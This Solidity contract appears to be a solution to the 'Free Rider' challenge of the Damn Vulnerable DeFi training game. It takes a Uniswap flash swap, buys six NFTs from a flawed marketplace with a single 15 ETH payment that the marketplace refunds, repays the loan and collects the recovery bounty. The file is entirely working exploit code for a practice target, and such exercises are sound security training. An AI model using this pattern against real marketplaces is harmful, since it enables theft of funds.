// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "./FreeRiderRecovery.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

interface WETH9 {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function totalSupply() external view returns (uint256);

    function approve(address guy, uint256 wad) external returns (bool);

    function transfer(address dst, uint256 wad) external returns (bool);

    function transferFrom(address src, address dst, uint256 wad) external returns (bool);

    function balanceOf(address guy) external view returns (uint256);
}

contract FreeRiderAttack {
    address player;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recoveryContract;
    IUniswapV2Pair uniswapPool;
    WETH9 weth;
    DamnValuableNFT dvNFT;

    modifier onlyPool() {
        require(msg.sender == address(uniswapPool), "only pool");
        _;
    }

    constructor(
        address _player,
        address payable _marketplace,
        address _recoveryContract,
        address _uniswapPool,
        address _weth,
        address _dvNFT
    ) {
        player = _player;
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recoveryContract = FreeRiderRecovery(_recoveryContract);
        uniswapPool = IUniswapV2Pair(_uniswapPool);
        weth = WETH9(_weth);
        dvNFT = DamnValuableNFT(_dvNFT);
    }

    function uniswapV2Call(address sender, uint256 amount0Out, uint256, bytes calldata) external payable onlyPool {
        require(sender == player, "Flash Swap can only be triggered by player");

        uint256 cost = 15 ether;

        weth.approve(address(weth), type(uint256).max);

        weth.withdraw(cost);

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        // This will send eth back to this contract. Some same 15 eth can be used to rebuy next NFT
        marketplace.buyMany{value: cost}(tokenIds);

        weth.deposit{value: 15 ether}();

        uint256 fee = 0.05 ether;

        weth.transfer(address(uniswapPool), amount0Out + fee);

        for (uint256 i = 0; i < tokenIds.length;) {
            dvNFT.safeTransferFrom(address(this), address(recoveryContract), tokenIds[i], abi.encode(player));
            unchecked {
                ++i;
            }
        }
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
